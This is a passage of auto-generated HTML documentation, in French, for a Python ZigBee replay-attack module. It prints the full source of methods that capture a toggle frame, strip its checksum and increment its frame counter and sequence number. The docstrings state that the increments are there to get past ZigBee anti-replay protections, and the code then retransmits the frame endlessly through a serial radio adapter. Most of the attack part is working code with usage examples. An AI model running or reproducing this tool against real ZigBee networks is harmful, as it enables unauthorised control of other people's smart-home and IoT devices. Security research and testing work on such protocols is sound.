5. Modification et envoi continu des trames avec incrémentation des compteurs

Notes
-----
- La trame initiale est tronquée de ses 4 derniers octets qui correspondent au FCS 
  (Frame Check Sequence), car celui-ci sera recalculé automatiquement par l&#39;adaptateur ZigBee.
- Les compteurs sont incrémentés à chaque itération pour contourner les protections
  anti-replay du protocole ZigBee.
- Si aucune trame n&#39;est capturée initialement, la méthode se termine sans erreur.

Exceptions
----------
- Toute exception lors de l&#39;envoi d&#39;une trame spécifique est capturée, journalisée,
  et provoque l&#39;arrêt de la boucle d&#39;envoi.
- Les exceptions de type serial.SerialException sont capturées et journalisées
  lorsqu&#39;il y a un problème avec le port série.

Exemple
-------
&gt;&gt;&gt; replay = ZigbeeReplayAttack(serial_port=&#39;/dev/ttyUSB0&#39;)
&gt;&gt;&gt; # La méthode s&#39;exécutera jusqu&#39;à ce qu&#39;elle soit interrompue par l&#39;utilisateur
&gt;&gt;&gt; # ou qu&#39;une exception se produise
&gt;&gt;&gt; replay.envoyer_trames_en_boucle()
&#34;&#34;&#34;
    trame_initiale = self.attendre_trame_data() #&#34;6188f2eff4ffff00004818ffff00001e19a13260feffbd4d742f3c60feffbd4d74400a060004010152010202&#34;#
    if not trame_initiale:
        return
    
    # Suppression des 4 derniers octets de la trame initiale
    trame_initiale = trame_initiale[:-4]
    print(&#34;Trame initiale : &#34;, trame_initiale)
    
    try:
        with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
            logger.info(f&#34;Début de l&#39;envoi sur {self.serial_port}&#34;)
            if self.sniffer.materiel == &#39;esp32h2&#39;:
                ser.write(bytes(&#34;#CMD#MODE_TX&#34;,&#39;utf-8&#39;))
            # Modification de la trame en incrémentant le compteur de trame
            trame_modifiee = self.framefinder.increment_frame_counter(trame_initiale)
            print(&#34;Trame modifiée : &#34;, trame_modifiee)
            trame_bytes = bytes.fromhex(trame_modifiee)

            # Envoi en boucle de la trame modifiée
            while True:
                try:
                    # Préfixe de trame (&#39;61&#39;) ajouté à la trame modifiée
                    ser.write(bytes.fromhex(&#39;61&#39;) + trame_bytes)
                    logger.debug(f&#34;Trame envoyée : {trame_bytes.hex()}&#34;)
                    time.sleep(3) 
                    print(&#34;Trame envoyée : &#34;, trame_bytes.hex())
                    
                    # Incrémentation du compteur de trame et du numéro de séquence pour la prochaine itération
                    trame_modifiee = self.framefinder.increment_frame_counter(trame_bytes.hex(), increment=1)
                    trame_modifiee = self.framefinder.increment_sequence_number(trame_modifiee, increment=1)

                    trame_bytes = bytes.fromhex(trame_modifiee)
                    print(&#34;Trame modifiée (extrait compteur) : &#34;, trame_bytes.hex()[-8:-6])
                    
                except Exception as e:
                    logger.error(f&#34;Erreur d&#39;envoi : {e}&#34;)
                    break
    except serial.SerialException as e:
        logger.error(f&#34;Erreur port série : {e}&#34;)</code></pre>
</details>
<div class="desc"><p>Envoie en boucle des trames de replay modifiées sur le réseau ZigBee.</p>
<p>Cette méthode capture d'abord une trame initiale (de type toggle) en utilisant
<code>attendre_trame_data()</code>, puis la modifie en incrémentant progressivement certains
champs comme le compteur de trame et le numéro de séquence. Les trames modifiées
sont envoyées en continu sur le réseau ZigBee via le port série spécifié,
avec un délai de 3 secondes entre chaque envoi.</p>
<p>Le processus comporte les étapes suivantes:
1. Capture d'une trame toggle initiale
2. Suppression des 4 derniers octets (FCS) de la trame
3. Ouverture du port série pour l'envoi
4. Pour le matériel ESP32H2, envoi d'une commande pour passer en mode transmission
5. Modification et envoi continu des trames avec incrémentation des compteurs</p>
<h2 id="notes">Notes</h2>
<ul>
<li>La trame initiale est tronquée de ses 4 derniers octets qui correspondent au FCS
(Frame Check Sequence), car celui-ci sera recalculé automatiquement par l'adaptateur ZigBee.</li>
<li>Les compteurs sont incrémentés à chaque itération pour contourner les protections
anti-replay du protocole ZigBee.</li>
<li>Si aucune trame n'est capturée initialement, la méthode se termine sans erreur.</li>
</ul>
<h2 id="exceptions">Exceptions</h2>
<ul>
<li>Toute exception lors de l'envoi d'une trame spécifique est capturée, journalisée,
et provoque l'arrêt de la boucle d'envoi.</li>
<li>Les exceptions de type serial.SerialException sont capturées et journalisées
lorsqu'il y a un problème avec le port série.</li>
</ul>
<h2 id="exemple">Exemple</h2>
<pre><code class="language-python-repl">&gt;&gt;&gt; replay = ZigbeeReplayAttack(serial_port='/dev/ttyUSB0')
&gt;&gt;&gt; # La méthode s'exécutera jusqu'à ce qu'elle soit interrompue par l'utilisateur
&gt;&gt;&gt; # ou qu'une exception se produise
&gt;&gt;&gt; replay.envoyer_trames_en_boucle()
</code></pre></div>
</dd>
<dt id="replay.ZigbeeReplayAttack.lancer_attaque_replay"><code class="name flex">
<span>def <span class="ident">lancer_attaque_replay</span></span>(<span>self, capture_live: bool = True)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def lancer_attaque_replay(self, capture_live: bool = True):
    &#34;&#34;&#34;
Lance l&#39;attaque de replay sur le réseau ZigBee.

Cette méthode coordonne l&#39;exécution complète de l&#39;attaque par rejeu. Elle peut 
fonctionner selon deux modes:
1. Mode capture en direct: capture des trames en temps réel, puis rejeu
2. Mode fichier: utilisation de trames précédemment capturées depuis un fichier

Un thread dédié est créé pour exécuter la fonction `envoyer_trames_en_boucle()`,
qui gère l&#39;envoi répété des trames modifiées. La méthode attend la fin de ce thread
avant de se terminer.

Paramètres
----------
capture_live : bool, optionnel
    Si True, active le mode de capture en direct des trames à partir du réseau.
    Si False, utilise un fichier de capture existant spécifié dans l&#39;attribut `capture_file`.
    Par défaut True.

Notes
-----
- En mode fichier (capture_live=False), la méthode tente de charger les captures 
  depuis le fichier spécifié lors de l&#39;initialisation.
- L&#39;exécution est bloquante jusqu&#39;à la fin du thread d&#39;envoi, qui normalement
  s&#39;exécute indéfiniment jusqu&#39;à ce qu&#39;une erreur se produise ou que l&#39;utilisateur
  l&#39;interrompe manuellement.

Exceptions
----------
- Toute exception survenant pendant l&#39;exécution de l&#39;attaque est capturée et journalisée,
  mais n&#39;est pas propagée à l&#39;appelant.
- Les exceptions possibles incluent les erreurs de lecture de fichier, les problèmes
  de communication série, ou les erreurs lors de la manipulation des trames.

Exemple
-------
&gt;&gt;&gt; replay = ZigbeeReplayAttack(
...     serial_port=&#39;/dev/ttyUSB0&#39;,
...     capture_file=&#39;trames_precedentes.json&#39;
... )
&gt;&gt;&gt; # Lancer l&#39;attaque avec capture en direct
&gt;&gt;&gt; replay.lancer_attaque_replay(capture_live=True)
&gt;&gt;&gt; 
&gt;&gt;&gt; # Ou utiliser un fichier de capture existant
&gt;&gt;&gt; replay.lancer_attaque_replay(capture_live=False)
&#34;&#34;&#34;
    try:
        if capture_live:
            logger.info(&#34;Mode capture live activé&#34;)
        else:
            with open(self.capture_file, &#39;r&#39;) as f:
                self.captures = json.load(f)

        thread_replay = threading.Thread(target=self.envoyer_trames_en_boucle)
        thread_replay.start()
        thread_replay.join()

    except Exception as e:
        logger.error(f&#34;Échec de l&#39;attaque : {e}&#34;)</code></pre>
</details>
<div class="desc"><p>Lance l'attaque de replay sur le réseau ZigBee.</p>
<p>Cette méthode coordonne l'exécution complète de l'attaque par rejeu. Elle peut
fonctionner selon deux modes:
1. Mode capture en direct: capture des trames en temps réel, puis rejeu
2. Mode fichier: utilisation de trames précédemment capturées depuis un fichier</p>
<p>Un thread dédié est créé pour exécuter la fonction <code>envoyer_trames_en_boucle()</code>,
qui gère l'envoi répété des trames modifiées. La méthode attend la fin de ce thread
avant de se terminer.</p>
<h2 id="parametres">Paramètres</h2>
<p>capture_live : bool, optionnel
Si True, active le mode de capture en direct des trames à partir du réseau.
Si False, utilise un fichier de capture existant spécifié dans l'attribut <code>capture_file</code>.
Par défaut True.</p>
<h2 id="notes">Notes</h2>
<ul>
<li>En mode fichier (capture_live=False), la méthode tente de charger les captures
depuis le fichier spécifié lors de l'initialisation.</li>
<li>L'exécution est bloquante jusqu'à la fin du thread d'envoi, qui normalement
s'exécute indéfiniment jusqu'à ce qu'une erreur se produise ou que l'utilisateur
l'interrompe manuellement.</li>
</ul>
<h2 id="exceptions">Exceptions</h2>
<ul>
<li>Toute exception survenant pendant l'exécution de l'attaque est capturée et journalisée,
mais n'est pas propagée à l'appelant.</li>
<li>Les exceptions possibles incluent les erreurs de lecture de fichier, les problèmes
de communication série, ou les erreurs lors de la manipulation des trames.</li>
</ul>
<h2 id="exemple">Exemple</h2>
<pre><code class="language-python-repl">&gt;&gt;&gt; replay = ZigbeeReplayAttack(
...     serial_port='/dev/ttyUSB0',
...     capture_file='trames_precedentes.json'
... )
&gt;&gt;&gt; # Lancer l'attaque avec capture en direct
&gt;&gt;&gt; replay.lancer_attaque_replay(capture_live=True)
&gt;&gt;&gt; 
&gt;&gt;&gt; # Ou utiliser un fichier de capture existant
&gt;&gt;&gt; replay.lancer_attaque_replay(capture_live=False)
</code></pre></div>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<div class="toc">
<ul>
<li><a href="#module-zigbee_replay_attack">Module : zigbee_replay_attack</a></li>
</ul>
</div>
<ul id="index">
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="replay.ZigbeeReplayAttack" href="#replay.ZigbeeReplayAttack">ZigbeeReplayAttack</a></code></h4>
<ul class="">
<li><code><a title="replay.ZigbeeReplayAttack.attendre_trame_data" href="#replay.ZigbeeReplayAttack.attendre_trame_data">attendre_trame_data</a></code></li>
<li><code><a title="replay.ZigbeeReplayAttack.envoyer_trames_en_boucle" href="#replay.ZigbeeReplayAttack.envoyer_trames_en_boucle">envoyer_trames_en_boucle</a></code></li>
<li><code><a title="replay.ZigbeeReplayAttack.lancer_attaque_replay" href="#replay.ZigbeeReplayAttack.lancer_attaque_replay">lancer_attaque_replay</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.11.5</a>.</p>
</footer>
</body>
</html>
